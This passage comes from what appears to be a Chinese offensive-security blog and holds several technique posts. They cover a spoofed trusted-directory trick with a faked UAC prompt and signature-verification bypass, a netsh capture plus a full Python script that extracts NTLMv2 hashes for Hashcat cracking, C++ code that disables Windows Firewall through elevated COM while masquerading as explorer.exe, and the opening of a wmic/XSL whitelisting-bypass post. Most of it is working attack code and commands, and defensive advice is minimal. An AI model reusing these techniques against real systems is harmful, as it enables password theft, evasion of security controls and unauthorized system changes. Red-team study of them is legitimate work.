<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>md "\\?\c:\windows "
md "\\?\c:\windows \system32"
</code></pre></div></div>

<h4 id="2-释放文件cwindows-system32calcexe">2. 释放文件<code class="language-plaintext highlighter-rouge">"c:\windows \system32\calc.exe"</code></h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>copy c:\test\putty.exe "\\?\c:\windows \system32\notepad.exe"
</code></pre></div></div>

<h4 id="3-执行">3. 执行</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>"c:\windows \system32\notepad.exe"
</code></pre></div></div>

<h4 id="4-重启后查看shimcache">4. 重启后查看ShimCache</h4>

<p>使用工具： https://github.com/mandiant/ShimCacheParser</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg export "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache" ShimCache.reg
ShimCacheParser.py -o out.csv -r c:\test\ShimCache.reg -t
</code></pre></div></div>

<p>查看结果，很具有迷惑性，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-2-15/3-1.png" alt="Alt text"></p>

<h2 id="0x04-利用模拟可信目录伪造正常的uac弹框">0x04 利用模拟可信目录伪造正常的UAC弹框</h2>
<hr>

<h3 id="1编写需要管理员权限运行的程序">1、编写需要管理员权限运行的程序</h3>

<p>使用Visual Studio</p>

<p>VS工程设置位置：</p>

<p><code class="language-plaintext highlighter-rouge">配置属性</code> -&gt; <code class="language-plaintext highlighter-rouge">链接器</code> -&gt; <code class="language-plaintext highlighter-rouge">清单文件</code>，选择需要管理员权限运行</p>

<p>也可以修改PE文件资源中的manifest</p>

<h3 id="2模拟可信目录释放文件">2、模拟可信目录，释放文件</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>copy c:\test\testuac.exe "\\?\c:\windows \system32\diskpart.exe"
</code></pre></div></div>

<p>执行：<code class="language-plaintext highlighter-rouge">"c:\windows \system32\diskpart.exe"</code></p>

<p>弹出UAC提示，显示路径为正常的diskpart.exe，但是没有签名会提示异常，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-2-15/4-1.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p>执行正常的diskpart.exe，UAC提示如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-2-15/4-2.png" alt="Alt text"></p>

<p>为了伪造成真正的UAC提示，可以使用PE文件的Authenticode签名伪造</p>

<p>参考资料： <a href="https://3gstudent.github.io/3gstudent.github.io/Authenticode%E7%AD%BE%E5%90%8D%E4%BC%AA%E9%80%A0-PE%E6%96%87%E4%BB%B6%E7%9A%84%E7%AD%BE%E5%90%8D%E4%BC%AA%E9%80%A0%E4%B8%8E%E7%AD%BE%E5%90%8D%E9%AA%8C%E8%AF%81%E5%8A%AB%E6%8C%81/">《Authenticode签名伪造——PE文件的签名伪造与签名验证劫持》</a></p>

<h3 id="3签名伪造">3、签名伪造</h3>

<p>使用SigThief，地址如下：</p>

<p>https://github.com/secretsquirrel/SigThief</p>

<p>参数如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sigthief.py -i C:\Windows\System32\consent.exe -t c:\test\testuac.exe -o c:\test\new.exe 
copy c:\test\new.exe "\\?\c:\windows \system32\diskpart.exe" /y
</code></pre></div></div>

<h3 id="4绕过证书验证">4、绕过证书验证</h3>

<p>添加注册表的命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>REG ADD "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}" /v "Dll" /t REG_SZ /d "C:\Windows\System32\ntdll.dll" /f
REG ADD "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}" /v "FuncName" /t REG_SZ /d "DbgUiContinue" /f
</code></pre></div></div>

<p>5、最终测试</p>

<p>再次执行：<code class="language-plaintext highlighter-rouge">"c:\windows \system32\diskpart.exe"</code>，UAC提示同真正的diskpart.exe一样，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-2-15/4-3.png" alt="Alt text"></p>

<h2 id="0x05-防御建议">0x05 防御建议</h2>
<hr>

<p>对于模拟可信目录的利用，前提是创建了伪造的目录，所以可选择对文件夹的短文件名进行监控</p>

<p>如果出现与系统目录相近的短文件名，可选择进行标记</p>

<p>查看短文件名的方法：  <code class="language-plaintext highlighter-rouge">dir /x</code></p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-2-15/5-1.png" alt="Alt text"></p>

<h2 id="0x06-小结">0x06 小结</h2>
<hr>

<p>本文介绍了模拟可信目录的另外三种利用技巧，最后给出防御建议</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on February 15, 2019
  </div>

  
</article><article class="post">
  <h1>渗透技巧——利用netsh抓取连接文件服务器的NTLMv2 Hash</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>在上篇文章<a href="https://3gstudent.github.io/3gstudent.github.io/Windows%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81hash-NTLM-hash%E5%92%8CNet-NTLM-hash%E4%BB%8B%E7%BB%8D/">《Windows下的密码hash——NTLM hash和Net-NTLM hash介绍》</a>比较了NTLM hash和Net-NTLM hash的区别，本文将继续对Net-NTLM hash在内网渗透中的应用作介绍，解决一个有趣的问题：</p>

<p><strong>如果获得了内网一个文件服务器的权限，如何获得更多用户的口令？</strong></p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>在windows平台下不安装任何第三方依赖库来进行网络抓包的方法</li>
  <li>将数据包转换成pcap格式</li>
  <li>使用Wireshark对数据包进行分析</li>
  <li>编写Python提取出NTLMv2 Hash</li>
  <li>使用Hashcat对Hash进行破解</li>
</ul>

<h2 id="0x02-解决思路">0x02 解决思路</h2>
<hr>

<p><a href="https://3gstudent.github.io/3gstudent.github.io/Windows%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81hash-NTLM-hash%E5%92%8CNet-NTLM-hash%E4%BB%8B%E7%BB%8D/">《Windows下的密码hash——NTLM hash和Net-NTLM hash介绍》</a>中提到，客户端在连接文件服务器时，默认会将当前登录用户的密码Hash发送至服务器进行验证，如果验证失败，需要重新输入登录用户名和口令</p>

<p>如果获得了内网一个文件服务器的权限，那么内网中的其他主机在使用界面尝试访问该服务器时，首先会将本机的密码Hash发送至服务器进行验证，在服务器端抓取数据包能够获得NTLM Response，对NTLM Response的格式进行解析，提取特定信息，使用Hashcat尝试字典破解或者暴力破解，就有可能还原出用户本机的明文口令</p>

<p>所以，接下来需要解决第一个问题： <strong>如何在文件服务器上抓取数据包？</strong></p>

<h2 id="0x03-windows平台下进行网络抓包的方法">0x03 Windows平台下进行网络抓包的方法</h2>
<hr>

<p>最常用的方法当然是安装Wireshark，但如果能找到一种不安装任何第三方依赖库、系统自带、直接用来抓包的方法岂不是更好？</p>

<p>方法当然是有的。</p>

<p>通过Windows系统自带的netsh中的trace功能能够实现不安装任何第三方依赖库，在命令行下进行抓包</p>

<p>支持Win7、Server2008R2及以后的系统，但不支持Server2008</p>

<p>官方说明文档：</p>

<p>https://technet.microsoft.com/en-us/library/dd878517%28v=ws.10%29.aspx</p>

<p><strong>注：</strong></p>

<p>netsh trace需要管理员权限</p>

<p>使用方法：</p>

<h3 id="1开启记录功能">1.开启记录功能</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netsh trace start capture=yes persistent=yes traceFile="c:\\test\\snmp1.etl" overwrite=yes correlation=no protocol=tcp ipv4.address=192.168.62.130 keywords=ut:authentication
</code></pre></div></div>

<p>参数说明：</p>

<ul>
  <li>capture=yes： 开启抓包功能</li>
  <li>persistent=yes： 系统重启不关闭抓包功能，只能通过Netsh trace stop关闭</li>
  <li>traceFile： 指定保存记录文件的路径</li>
  <li>overwrite=yes： 如果文件存在，那么对其覆盖</li>
  <li>correlation=no： 不收集关联事件</li>
  <li>protocol=tcp： 抓取TPC协议</li>
  <li>ipv4.address=192.168.62.130： 限定只抓和服务器IP相关的数据包</li>
  <li>keywords=ut:authentication： 关键字为ut:authentication</li>
</ul>

<p>加上以上限定参数是为了尽可能减小数据包大小，只筛选出SMB协议中同NTLMv2认证有关的内容</p>

<p><strong>注：</strong></p>

<p>同级目录下会生成系统的配置文件压缩包，后缀名为.cab</p>

<h3 id="2关闭记录功能">2.关闭记录功能</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Netsh trace stop
</code></pre></div></div>

<p>关闭功能后，系统会将捕获到的数据包保存为etl结尾的文件</p>

<p>演示如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-1-15/2-1.png" alt="Alt text"></p>

<h3 id="3查看etl文件">3.查看etl文件</h3>

<p>etl文件无法直接打开，需要借助工具windows message analyzer将其转换成.cap格式(Wireshark能够识别)</p>

<p>windows message analyzer下载地址：</p>

<p>https://www.microsoft.com/en-us/download/confirmation.aspx?id=44226</p>

<p>安装后打开etl文件，等待文件识别，识别成功后界面左下角提示<code class="language-plaintext highlighter-rouge">Ready</code>，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-1-15/2-2.png" alt="Alt text"></p>

<h3 id="4转换成cap格式">4.转换成.cap格式</h3>

<p><code class="language-plaintext highlighter-rouge">File</code>-<code class="language-plaintext highlighter-rouge">Save as</code>-<code class="language-plaintext highlighter-rouge">Export</code>，保存成cap包格式</p>

<p>使用Wireshark打开cap包文件，成功读取数据包文件，获得服务器上的数据包</p>

<p>从数据包中能找到SMB2协议，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-1-15/2-3.png" alt="Alt text"></p>

<p>提取其中的一组数据包，还原出NTLM v2的关键信息，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-1-15/2-4.png" alt="Alt text"></p>

<p>拼接固定格式： <code class="language-plaintext highlighter-rouge">username::domain:challenge:HMAC-MD5:blob</code></p>

<p>使用Hashcat进行破解</p>

<p><strong>注：</strong></p>

<p>详细破解方法可参考文章<a href="https://3gstudent.github.io/3gstudent.github.io/Windows%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81hash-NTLM-hash%E5%92%8CNet-NTLM-hash%E4%BB%8B%E7%BB%8D/">《Windows下的密码hash——NTLM hash和Net-NTLM hash介绍》</a>，本文不再演示</p>

<p>如果手动组装多个NTLM v2响应包，费事费力，所以需要编写程序自动解析数据包，提取出Hashcat可用的NTLM v2内容</p>

<p>这就是第二个问题： <strong>如何通过程序实现自动解析数据包，提取NTLM v2的内容？</strong></p>

<h2 id="0x04-通过程序实现自动解析数据包">0x04 通过程序实现自动解析数据包</h2>
<hr>

<p>开发语言： python</p>

<p>python模块： scapy</p>

<p>说明地址：</p>

<p>https://github.com/invernizzi/scapy-http</p>

<p>安装：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>easy_install scapy
easy_install scapy_http
</code></pre></div></div>

<p>scapy能够解析pcap数据包，所以在使用前，先使用Wireshark将.cap包转换成pcap包</p>

<p>scapy示例代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>try:
    import scapy.all as scapy
except ImportError:
    import scapy

try:
    # This import works from the project directory
    import scapy_http.http
except ImportError:
    # If you installed this package via pip, you just need to execute this
    from scapy.layers import http

packets = scapy.rdpcap('test.pcap')
for p in packets:
    print('=' * 78)
    p.show()
</code></pre></div></div>

<p>自动解析出每个数据包的格式，分为Ethernet、IP、TCP和Raw，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-1-15/3-1.png" alt="Alt text"></p>

<p>程序开发思路：</p>

<ol>
  <li>对目的端口进行判断，选出SMB协议的数据包</li>
  <li>筛选出NTLMv2 Response数据包</li>
  <li>通过当前数据包获得username、domain、HMAC-MD5和blob</li>
  <li>通过前一数据包获得Server challenge</li>
</ol>

<p>具体实现：</p>

<h4 id="1选出smb协议的数据包">1.选出SMB协议的数据包</h4>

<p>目的端口为445</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>packets[p]['TCP'].dport == 445
</code></pre></div></div>

<h4 id="2筛选出ntlmv2-response数据包">2.筛选出NTLMv2 Response数据包</h4>

<p>TCP payload包含特殊字符串NTLMSSP</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>packets[p]['Raw'].load.find('NTLMSSP') != -1
</code></pre></div></div>

<h4 id="3获得通过当前数据包获得usernamedomainhmac-md5和blob">3.获得通过当前数据包获得username、domain、HMAC-MD5和blob</h4>

<p>HMAC-MD5和blob为固定位置，直接通过固定偏移即可获得</p>

<p>username和domain为固定格式，2字节表示Length，2字节表示Maxlen，4字节表示偏移，值得注意的2字节长度实际上为int型数据，在读取时高低位要互换</p>

<p>例如读取出16进制数据为4601，实际计算的是0146转换成10进制的值，为326</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>DomainLength1 = int(TCPPayload[Flag+28:Flag+28+1].encode("hex"),16)
DomainLength2 = int(TCPPayload[Flag+28+1:Flag+28+1+1].encode("hex"),16)*256                             
DomainLength = DomainLength1 + DomainLength2
</code></pre></div></div>

<p>domain以Unicode格式保存，需要转换成ascii，具体实现是把字符串转换成数组，只取奇数位</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>DomainName = [DomainNameUnicode[i] for i in range(len(DomainNameUnicode)) if i%2==0]
DomainName = ''.join(DomainName)
</code></pre></div></div>

<p>完整实现代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#!/usr/bin/env python
try:
      import scapy.all as scapy
except ImportError:
      import scapy

try:
    # This import works from the project directory
      import scapy_http.http
except ImportError:
    # If you installed this package via pip, you just need to execute this
      from scapy.layers import http

packets = scapy.rdpcap('6.pcap')
Num = 1
for p in range(len(packets)):
      try:
            if packets[p]['TCP'].dport ==445:
                  TCPPayload = packets[p]['Raw'].load
                  
                  if TCPPayload.find('NTLMSSP') != -1:
                        if len(TCPPayload) &gt; 500:       
                              print ("----------------------------------Hashcat NTLMv2 No.%s----------------------------------"%(Num))
                              Num = Num+1
                              print ("PacketNum: %d"%(p+1))
                              print ("src: %s"%(packets[p]['IP'].src))
                              print ("dst: %s"%(packets[p]['IP'].dst))
                              Flag = TCPPayload.find('NTLMSSP')

                              ServerTCPPayload = packets[p-1]['Raw'].load
                             
                              ServerFlag = ServerTCPPayload.find('NTLMSSP')
                              ServerChallenge = ServerTCPPayload[ServerFlag+24:ServerFlag+24+8].encode("hex")
                              print ("ServerChallenge: %s"%(ServerChallenge))


                              DomainLength1 = int(TCPPayload[Flag+28:Flag+28+1].encode("hex"),16)
                              DomainLength2 = int(TCPPayload[Flag+28+1:Flag+28+1+1].encode("hex"),16)*256                             
                              DomainLength = DomainLength1 + DomainLength2
                              #print DomainLength
                              DomainNameUnicode = TCPPayload[Flag+88:Flag+88+DomainLength]
                              DomainName = [DomainNameUnicode[i] for i in range(len(DomainNameUnicode)) if i%2==0]
                              DomainName = ''.join(DomainName)
                              print ("DomainName: %s"%(DomainName))                                                          
 
                              UserNameLength1 = int(TCPPayload[Flag+36:Flag+36+1].encode("hex"),16)
                              UserNameLength2 = int(TCPPayload[Flag+36+1:Flag+36+1+1].encode("hex"),16)*256                             
                              UserNameLength = UserNameLength1 + UserNameLength2
                              #print UserNameLength
                              UserNameUnicode = TCPPayload[Flag+88+DomainLength:Flag+88+DomainLength+UserNameLength]
                              UserName = [UserNameUnicode[i] for i in range(len(UserNameUnicode)) if i%2==0]
                              UserName = ''.join(UserName)
                              print ("UserName: %s"%(UserName))  
                                                                             
                              NTLMResPonseLength1 = int(TCPPayload[Flag+20:Flag+20+1].encode("hex"),16)
                              NTLMResPonseLength2 = int(TCPPayload[Flag+20+1:Flag+20+1+1].encode("hex"),16)*256
                              NTLMResPonseLength = NTLMResPonseLength1 + NTLMResPonseLength2                             
                              #print NTLMResPonseLength                                                         
                              NTLMResPonse = TCPPayload[Flag+174:Flag+174+NTLMResPonseLength].encode("hex")                                       
                              #print NTLMResPonse
                              print "Hashcat NTLMv2:"
                              print ("%s::%s:%s:%s:%s"%(UserName,DomainName,ServerChallenge,NTLMResPonse[:32],NTLMResPonse[32:]))
                              
      except:
            pass
    

</code></pre></div></div>

<p>执行后程序输出如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-1-15/3-2.png" alt="Alt text"></p>

<p>接着使用Hashcat进行破解即可</p>

<p><strong>注：</strong></p>

<p>解析pcap包的开源工具：</p>

<p>https://github.com/DanMcInerney/net-creds</p>

<p>但在解析ntlmv2的challenge时会出现bug</p>

<h2 id="0x05-补充">0x05 补充</h2>
<hr>

<p>对于文件服务器，如果开启了NetBIOS over TCP/IP，那么禁用445端口后，系统会尝试使用139端口进行连接</p>

<p>测试如下：</p>

<p>服务器禁用445端口，开启139端口</p>

<p>客户端尝试连接，SMB协议使用139端口，抓包如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-1-15/4-1.png" alt="Alt text"></p>

<p>如果禁用了NetBIOS over TCP/IP，那么禁用445端口后，无法使用文件共享</p>

<h2 id="0x06-小结">0x06 小结</h2>
<hr>

<p>本文解决了在获得内网一个文件服务器的权限后，获得更多用户的口令的问题。</p>

<p>通过Windows命令行抓包获得SMB协议内容，编写程序自动提取NTLMv2 Hash，使用Hashcat进行破解，有可能还原出用户本机的明文口令</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on January 15, 2018
  </div>

  
</article><article class="post">
  <h1>通过COM组件NetFwPolicy2越权关闭防火墙</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>在上篇文章<a href="https://3gstudent.github.io/3gstudent.github.io/%E9%80%9A%E8%BF%87COM%E7%BB%84%E4%BB%B6IFileOperation%E8%B6%8A%E6%9D%83%E5%A4%8D%E5%88%B6%E6%96%87%E4%BB%B6/">《通过COM组件IFileOperation越权复制文件》</a>介绍了通过COM组件IFileOperation越权复制文件的三种方法，我们得出一个推论：<strong>对于explorer.exe(或是模拟成explorer.exe)，加载高权限的COM组件不会弹出UAC的对话框</strong></p>

<p>那么，这个推论是否适用于其他COM组件呢？又有哪些COM组件可以利用呢？</p>

<p>本文将要通过COM组件越权关闭防火墙的方法，详细记录研究过程</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<ul>
  <li>寻找可以高权限运行的COM组件</li>
  <li>编写c++程序实现关闭防火墙</li>
  <li>添加代码以高权限运行COM组件</li>
  <li>添加代码模拟进程explorer.exe</li>
  <li>开源完整实现代码</li>
</ul>

<h2 id="0x02-寻找可以高权限运行的com组件">0x02 寻找可以高权限运行的COM组件</h2>
<hr>

<p>通过COM组件IFileOperation实现越权复制文件有一个前提： COM组件能够以高权限运行</p>

<p>对于IFileOperation，它提供了一个参数(SetOperationFlags)可以指定启动的权限</p>

<p>官方文档：</p>

<p>https://msdn.microsoft.com/en-us/library/bb775799.aspx</p>

<p>为了找到其他可以高权限运行的COM组件，我们首要的是寻找能够以高权限运行COM组件的方法</p>

<p>经过查找，我找到了一个资料，利用COM Elevation Moniker能够以高权限运行COM组件</p>

<p>官方文档：</p>

<p>https://msdn.microsoft.com/en-us/library/windows/desktop/ms679687(v=vs.85).aspx</p>

<p>通过学习官方文档，发现COM Elevation Moniker的使用对COM组件有如下要求：</p>

<ol>
  <li>该COM组件被注册</li>
  <li>注册位置在<code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE</code>下，也就是说，需要以管理员权限注册这个COM组件才可以</li>
  <li>注册表<code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\Software\Classes\CLSID</code>下需要指定三项键值
    <ul>
      <li>{CLSID}, LocalizedString(REG_EXPAND_SZ):displayName</li>
      <li>{CLSID}/Elevation,IconReference(REG_EXPAND_SZ):applicationIcon</li>
      <li>{CLSID}/Elevation,Enabled(REG_DWORD):1</li>
    </ul>
  </li>
</ol>

<p><strong>注：</strong></p>

<p>经过实际测试，以上三项缺一不可</p>

<p>接下来，按照这个要求搜索注册表寻找可用的COM组件</p>

<p>搜索位置：<code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID</code></p>

<p>搜索关键词：<code class="language-plaintext highlighter-rouge">Elevation</code></p>

<p>经过一段时间的搜索，我找到了一个可用的COM组件，位置：<code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{E2B3C97F-6AE1-41AC-817A-F6F92166D7DD}</code></p>

<p>信息如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-5-20/2-1.png" alt="Alt text"></p>

<p><code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{E2B3C97F-6AE1-41AC-817A-F6F92166D7DD}\Elevation</code>的信息如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-5-20/2-2.png" alt="Alt text"></p>

<p>满足COM Elevation Moniker的要求</p>

<p>通过搜索名称“HNetCfg.FwPolicy2”发现这个COM组件同防火墙的操作有关</p>

<h2 id="0x03-编写c程序实现关闭防火墙">0x03 编写c++程序实现关闭防火墙</h2>
<hr>

<p>对应COM接口<code class="language-plaintext highlighter-rouge">INetFwProfile</code>，于是查找资料尝试编写c程序实现</p>

<p>通过COM接口INetFwProfile关闭防火墙的完整c++代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include "stdafx.h"
#include &lt;Strsafe.h&gt;
#include &lt;windows.h&gt;
#include &lt;netfw.h&gt;

int _tmain(int argc, _TCHAR* argv[])
{
	INetFwMgr *g_pFwMgr = NULL;
	INetFwProfile *g_pFwProfile = NULL;
	INetFwPolicy *g_pFwProlicy = NULL;
	CoInitializeEx(NULL,COINIT_MULTITHREADED);
	VARIANT_BOOL fwEnabled;
	HRESULT hr = CoCreateInstance(__uuidof(NetFwMgr), 0, CLSCTX_INPROC_SERVER,__uuidof(INetFwMgr),reinterpret_cast&lt;void **&gt;(&amp;g_pFwMgr));
	if (SUCCEEDED(hr) &amp;&amp; (g_pFwMgr != NULL))
	{
		hr = g_pFwMgr-&gt;get_LocalPolicy( &amp;g_pFwProlicy );
		if (SUCCEEDED(hr) &amp;&amp; (g_pFwProlicy != NULL))
		{
			hr = g_pFwProlicy-&gt;get_CurrentProfile( &amp;g_pFwProfile );
			hr = g_pFwProfile-&gt;get_FirewallEnabled(&amp;fwEnabled);
			if (fwEnabled != VARIANT_FALSE)  
			{    
				printf("The firewall is on.\n");  
				hr = g_pFwProfile-&gt;put_FirewallEnabled(VARIANT_FALSE);  
				if (FAILED(hr))  
				{  
					printf("put_FirewallEnabled failed: 0x%08lx\n", hr);  
					return 0;
				}  
				printf("The firewall is now off.\n");  
			}  
			else  
			{  
				printf("The firewall is off.\n");  
			}  
		}
	}
	return 0;
}
</code></pre></div></div>

<p>程序首先读取防火墙配置，如果防火墙的状态是开启，尝试对其关闭</p>

<p>当然，需要管理员权限执行，执行后失败，弹框如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-5-20/2-3.png" alt="Alt text"></p>

<p>接着查找问题，找到原因，官方文档：</p>

<p>https://msdn.microsoft.com/en-us/library/windows/desktop/aa365287</p>

<p>原因如下：</p>

<blockquote>
  <p>[The Windows Firewall API is available for use in the operating systems specified in the Requirements section. It may be altered or unavailable in subsequent versions. For Windows Vista and later, use of the Windows Firewall with Advanced Security API is recommended.]</p>
</blockquote>

<p>需要换用Windows Firewall with Advanced Security API，官方文档：</p>

<p>https://msdn.microsoft.com/en-us/library/windows/desktop/aa366418</p>

<p>找到关闭防火墙的实例，地址如下：</p>

<p>https://msdn.microsoft.com/en-us/library/windows/desktop/dd339606</p>

<p>发现新的COM组件为<code class="language-plaintext highlighter-rouge">NetFwPolicy2</code></p>

<p>实例代码已经很清楚，但为了配合后面会使用到的COM Elevation Moniker，在结构上需要做一些修改</p>

<h2 id="0x04-添加代码以高权限运行com组件">0x04 添加代码以高权限运行COM组件</h2>
<hr>

<p>官方文档：</p>

<p>https://msdn.microsoft.com/en-us/library/windows/desktop/ms679687(v=vs.85).aspx</p>

<p>官方文档提供了一个实例，但是需要做一些修改</p>

<p>修改后的代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	HWND		hwnd = GetConsoleWindow();
	BIND_OPTS3	bo;
	WCHAR		wszCLSID[50];
	WCHAR		wszMonikerName[300];
	void ** ppv = NULL;
	StringFromGUID2( __uuidof(NetFwPolicy2),wszCLSID,sizeof(wszCLSID)/sizeof(wszCLSID[0])); 
	hr = StringCchPrintf(wszMonikerName,sizeof(wszMonikerName)/sizeof(wszMonikerName[0]),L"Elevation:Administrator!new:%s", wszCLSID);
	memset(&amp;bo, 0, sizeof(bo));
	bo.cbStruct			= sizeof(bo);
	bo.hwnd				= hwnd;
	bo.dwClassContext	= CLSCTX_LOCAL_SERVER;
	hr =  CoGetObject(wszMonikerName, &amp;bo, IID_PPV_ARGS(&amp;pNetFwPolicy2));
</code></pre></div></div>

<p>对于CoGetObject(),第一个参数为GUID对应的字符串，需要指定为<code class="language-plaintext highlighter-rouge">NetFwPolicy2</code>，第三个参数做了一个封装，实际为<code class="language-plaintext highlighter-rouge">REFIID riid</code>和<code class="language-plaintext highlighter-rouge">void      **ppv</code></p>

<p>这段代码要放在CoCreateInstance函数创建实例之后</p>

<p>我们现在重新分析0x03中关闭防火墙的实现代码，官方文档(含实例代码):</p>

<p>https://msdn.microsoft.com/en-us/library/windows/desktop/dd339606</p>

<p>关键代码如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-5-20/3-1.png" alt="Alt text"></p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-5-20/3-2.png" alt="Alt text"></p>

<p>调用CoCreateInstance函数创建实例被单独写在了一个函数WFCOMInitialize中，如果我们在WFCOMInitialize中实现了COM Elevation Moniker申请高权限，但是在函数返回时无法传出修改的值<code class="language-plaintext highlighter-rouge">void **ppv</code>(函数返回值为hr)，也就是说即使在函数WFCOMInitialize中申请到了高权限，跳出函数WFCOMInitialize后，回到主函数，后面使用的COM组件依然是旧的低权限</p>

<p>所以我们需要对实例代码作修改，将调用CoCreateInstance函数创建实例的代码提取出来，放在主函数中</p>

<h2 id="0x05-添加代码模拟进程explorerexe">0x05 添加代码模拟进程explorer.exe</h2>
<hr>

<p>这部分内容在之前的文章<a href="https://3gstudent.github.io/3gstudent.github.io/%E9%80%9A%E8%BF%87COM%E7%BB%84%E4%BB%B6IFileOperation%E8%B6%8A%E6%9D%83%E5%A4%8D%E5%88%B6%E6%96%87%E4%BB%B6/">《通过COM组件IFileOperation越权复制文件》</a>有过介绍，对应方法2，可供参考的代码：</p>

<p>https://github.com/3gstudent/Use-COM-objects-to-bypass-UAC/blob/master/MasqueradePEB.cpp</p>

<p>修改当前进程的PEB结构，欺骗PSAPI，将当前进程模拟为explorer.exe</p>

<p>完整代码已开源，地址如下：</p>

<p>https://github.com/3gstudent/Use-COM-objects-to-bypass-UAC/blob/master/DisableFirewall.cpp</p>

<h2 id="0x06-小结">0x06 小结</h2>
<hr>

<p>本文介绍了通过COM组件越权关闭防火墙的思路和实现方法，验证了推论：对于explorer.exe(或是模拟成explorer.exe)，加载高权限的COM组件不会弹出UAC的对话框</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>

  </div>

  <div class="date">
    Written on May 20, 2018
  </div>

  
</article><article class="post">
  <h1>利用wmic调用xsl文件的分析与利用</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>Casey Smith@subTee在博客分享的一个技巧，使用wmic能够从本地或从URL调用XSL（可扩展样式表语言）脚本。这个发现很有用，不仅可以作为一种白名单绕过的方法，而且可以作为payload来使用(从URL调用XSL脚本，利用XSL执行exe、shellcode、powershell脚本)。</p>

<p>本文将要对该项技术进行测试，结合自己的经验对其扩展，分享一个后门利用的思路，介绍同XXE漏洞结合的使用方法。</p>

<p>博客地址：</p>

<p>https://subt0x11.blogspot.ca/2018/04/wmicexe-whitelisting-bypass-hacking.html?m=1</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>测试Casey Smith的方法</li>
  <li>脚本分析，分析后门利用思路</li>
  <li>编写后门利用脚本</li>
  <li>同XXE漏洞的结合</li>
</ul>

<h2 id="0x02-测试casey-smith的方法">0x02 测试Casey Smith的方法</h2>
<hr>

<p>本地：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wmic process list /FORMAT:evil.xsl
</code></pre></div></div>

<p>远程：</p>

